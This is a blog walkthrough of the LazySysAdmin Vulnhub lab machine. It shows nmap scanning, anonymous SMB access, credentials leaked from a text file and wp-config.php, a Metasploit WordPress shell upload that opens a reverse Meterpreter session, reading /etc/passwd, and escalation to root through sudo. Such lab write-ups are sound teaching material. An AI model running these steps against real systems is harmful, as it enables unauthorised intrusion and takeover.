---
date: 2020-04-27 03:43:30
layout: post
title: "LazySysAdmin Vulnhub Walkthrough"
subtitle:
description: Today we will be doing LazySysAdmin from Vulnhub. An easy boot2root machine configured by a lazy system administrator.
image: /assets/img/uploads/lazySysAdmin/lazy.jpg
optimized_image: /assets/img/uploads/lazySysAdmin/lazy.jpg
category: walkthrough
tags: vulnhub boot2root
author: madhavmehndiratta
paginate: false
keywords: lazysysadmin walkthrough, vulnhub, lazysysadmin writeup, lazysysadmin vulnhub walkthrough, infosec articles
---

Today we will be doing LazySysAdmin from Vulnhub. An easy boot2root machine created by 'Togie Mcdogie'. The machine truly stands up to its name. This machine was configured by a lazy system administrator and thus, one clear thing to be looking for is a misconfigured system. Lets dive in!

We begin our reconnaissance by running a port scan with Nmap, checking default scripts.

```r
m1m3@kali:~$ nmap -sV -sV -oA nmap/lazySysAdmin 192.168.1.9 

Starting Nmap 7.80 ( https://nmap.org )
Nmap scan report for 192.168.1.9
Host is up (0.0044s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL (unauthorized)
6667/tcp open  irc         InspIRCd
Service Info: Hosts: LAZYSYSADMIN, Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.93 seconds
```

We see a mysql port open and Samba smd running on port 139 and 445. We also have a webserver running at port 80.

<center><br>
<img src="/assets/img/uploads/lazySysAdmin/port80.png">
</center>

Let's try gaining access to the samba and see if we can login anonymously. We will use <i>smbclient</i> for this. If it asks for any password, just leave it empty and press enter.

```r
m1m3@kali:~$ smbclient -L 192.168.1.9

Enter WORKGROUP\m1m3's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        share$          Disk      Sumshare
        IPC$            IPC       IPC Service (Web server)
SMB1 disabled -- no workgroup available
```

We can access the share$ folder using: 

```r
m1m3@kali:~$ smbclient  '\\192.168.1.9\share$'

Enter WORKGROUP\m1m3's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Aug 15 16:35:52 2017
  ..                                  D        0  Mon Aug 14 18:04:47 2017
  wordpress                           D        0  Thu Apr 30 00:15:04 2020
  Backnode_files                      D        0  Mon Aug 14 17:38:26 2017
  wp                                  D        0  Tue Aug 15 16:21:23 2017
  deets.txt                           N      139  Mon Aug 14 17:50:05 2017
  robots.txt                          N       92  Mon Aug 14 18:06:14 2017
  todolist.txt                        N       79  Mon Aug 14 18:09:56 2017
  apache                              D        0  Mon Aug 14 18:05:19 2017
  index.html                          N    36072  Sun Aug  6 10:32:15 2017
  info.php                            N       20  Tue Aug 15 16:25:19 2017
  test                                D        0  Mon Aug 14 18:05:10 2017
  old                                 D        0  Mon Aug 14 18:05:13 2017

                3029776 blocks of size 1024. 1459952 blocks available          
smb: \> 
```

We see some interesting test files here, let's download them and see if they have anything useful.

```r
smb: \> get deets.txt
getting file \deets.txt of size 139 as deets.txt (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
smb: \> get todolist.txt
getting file \todolist.txt of size 79 as todolist.txt (12.9 KiloBytes/sec) (average 1.5 KiloBytes/sec)
smb: \> ^C

m1m3@kali:~$ cat deets.txt 
CBF Remembering all these passwords.

Remember to remove this file and update your password after we push out the server.

Password 12345

m1m3@kali:~$ cat todolist.txt 
Prevent users from being able to view to web root using the local file browser
m1m3@kali:~$ 
[1] 0:bash*                                                                                               
```

Awesome! <i>deets.txt</i> reveals a password 12345. Another thing now we can look at is the wordpress directory.

```r
smb: \> cd wordpress
smb: \wordpress\> ls
  .                                   D        0  Thu Apr 25 00:15:04 2020
  ..                                  D        0  Tue Aug 15 16:35:52 2017
  wp-config-sample.php                N     2853  Wed Dec 16 15:28:26 2015
  wp-trackback.php                    N     4513  Sat Oct 15 01:09:28 2016
  wp-admin                            D        0  Thu Aug  3 02:32:02 2017
  wp-settings.php                     N    16200  Thu Apr  6 23:31:42 2017
  wp-blog-header.php                  N      364  Sat Dec 19 16:50:28 2015
  index.php                           N      418  Wed Sep 25 05:48:11 2013
  wp-cron.php                         N     3286  Sun May 24 22:56:25 2015
  wp-links-opml.php                   N     2422  Mon Nov 21 08:16:30 2016
  readme.html                         N     7413  Mon Dec 12 13:31:39 2016
  wp-signup.php                       N    29924  Tue Jan 24 16:38:42 2017
  wp-content                          D        0  Thu Apr 30 00:31:17 2020
  license.txt                         N    19935  Mon Jan  2 23:28:42 2017
  wp-mail.php                         N     8048  Wed Jan 11 10:43:43 2017
  wp-activate.php                     N     5447  Wed Sep 28 03:06:28 2016
  .htaccess                           H       35  Tue Aug 15 17:10:13 2017
  xmlrpc.php                          N     3065  Wed Aug 31 22:01:29 2016
  wp-login.php                        N    34327  Fri May 12 22:42:46 2017
  wp-load.php                         N     3301  Tue Oct 25 08:45:30 2016
  wp-comments-post.php                N     1627  Mon Aug 29 17:30:32 2016
  wp-config.php                       N     3703  Mon Aug 21 14:55:14 2017
  wp-includes                         D        0  Thu Aug  3 02:32:03 2017

                3029776 blocks of size 1024. 1459952 blocks available          
smb: \wordpress\> 
```
 Looking into the wp-config, we get some username and password.

```r
 /** MySQL database username */
define('DB_USER', 'Admin');

/** MySQL database password */
define('DB_PASSWORD', 'TogieMYSQL12345^^');
```

We can use these to login into the wp-admin

<center><br>
<img src="/assets/img/uploads/lazySysAdmin/wordpress.png">
</center>

Now that we are successfully logged in, we can upload a payload packaged as a WordPress plugin. We can use metasploit here to exploit the server.

```r
msf5 > use exploit/unix/webapp/wp_admin_shell_upload 
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set RHOSTS 192.168.1.9
RHOSTS => 192.168.1.9
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set TARGETURI /wordpress
TARGETURI => /wordpress
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME admin
USERNAME => admin
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD TogieMYSQL12345^^
PASSWORD => TogieMYSQL12345^^
msf5 exploit(unix/webapp/wp_admin_shell_upload) > exploit

[*] Started reverse TCP handler on 192.168.1.12:4444 
[*] Authenticating with WordPress using admin:TogieMYSQL12345^^...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wordpress/wp-content/plugins/nqVodSMHuP/rimGsZTjkk.php...
[*] Sending stage (38288 bytes) to 192.168.1.9
[*] Meterpreter session 1 opened (192.168.1.12:4444 -> 192.168.1.9:45938)
[+] Deleted rimGsZTjkk.php
[+] Deleted nqVodSMHuP.php
[+] Deleted ../nqVodSMHuP

meterpreter > shell
Process 1697 created.
Channel 0 created.
id       
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@LazySysAdmin:$
```

Looking into the /etc/passwd, we can see a user named  <i>togie</i>

```r
www-data@LazySysAdmin:$ cat /etc/passwd
cat /etc/passwd

togie:x:1000:1000:togie,,,:/home/togie:/bin/rbash

www-data@LazySysAdmin:$ 
```

This will be our way In!  We can now ssh into the user or simply use <i>su</i> to login with the password we got from <i>deets.txt.</i> 

```r
www-data@LazySysAdmin:$ su togie
su togie
Password: 12345
togie@LazySysAdmin:$ id
id
uid=1000(togie) gid=1000(togie) groups=1000(togie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare)
togie@LazySysAdmin:$ 
```

We can see that the user is added in the <i>sudoers</i> group. Therefore we can directly run <i>sudo su </i> to get the root shell.

```r
togie@LazySysAdmin:$ sudo su
sudo su
[sudo] password for togie: 12345

root@LazySysAdmin:.# 
```

That's it! We rooted the box. Now we can read our flag.

```r
root@LazySysAdmin:.# cat /root/proof.txt/
cat /root/proof.txt
WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851


Well done :)

Hope you learn't a few things along the way.

Regards,

Togie Mcdogie




Enjoy some random strings

WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851
2d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7
pf%&1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02
bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu

root@LazySysAdmin:.# 
```

That’s it! Thanks for reading. Stay tuned for similar walkthroughs and much more coming up in the near future!
If you have any queries, you can contact me <a href="/contact">here.</a>

NOTE: The awesome artwork used in this article was created by <a href="https://dribbble.com/Jothon">Joshua Anderson.</a>